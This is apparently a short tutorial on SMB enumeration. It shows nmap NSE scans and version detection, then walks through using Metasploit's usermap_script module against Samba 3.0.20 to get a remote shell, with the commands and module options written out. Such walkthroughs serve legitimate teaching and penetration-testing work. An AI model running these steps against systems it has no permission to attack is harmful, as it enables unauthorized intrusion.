# SMB Enumeration
**SMB** stands for server message block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server. It primarily runs on port **445** or port **139** depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In linux however ,it is a little different. To make it work for linux, you need to install a samba server because linux natively does not use SMB protocol.


# Enumeration of Services
As SMB runs on 139 or 445,We use **Nmap** scripting engine or commonly known as NSE.
NSE Contains many Scripts which can be used for enumeration and exploitation.We can check the scripts using command

``ls /usr/share/nmap/scripts/ | grep smb``

![enter image description here](https://raw.githubusercontent.com/shubham381/smb_enumeration/master/smb-nmap.png)

or we can use deafult **NSE** script

``nmap -sC -p 139,445 -sV <target ip>``
![enter image description here](https://raw.githubusercontent.com/shubham381/smb_enumeration/master/smb-services.png)

Nice ! we found out the version of Samba running in the server. Now just go to google and search whether the given version is vulnerable or not.

There are many ways to enumerate the service itself.I am using **metasploit**.

After finding the version we can use metasploit to exploit the service.

``msf5 auxiliary> search samba``

![enter image description here](https://raw.githubusercontent.com/shubham381/smb_enumeration/master/exploit%20search.png)

We need to use usermap_script to exploit **3.0.20**

``msf5 auxiliary > use exploit/multi/samba/usermap_script``

now we need to find requirement 

```msf5 exploit(multi/samba/usermap_script) > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
Ok! we only need to give the ip of remote host and the it will exploit it automatically..![enter image description here](https://raw.githubusercontent.com/shubham381/smb_enumeration/master/explot.png)
Here we got shelll....

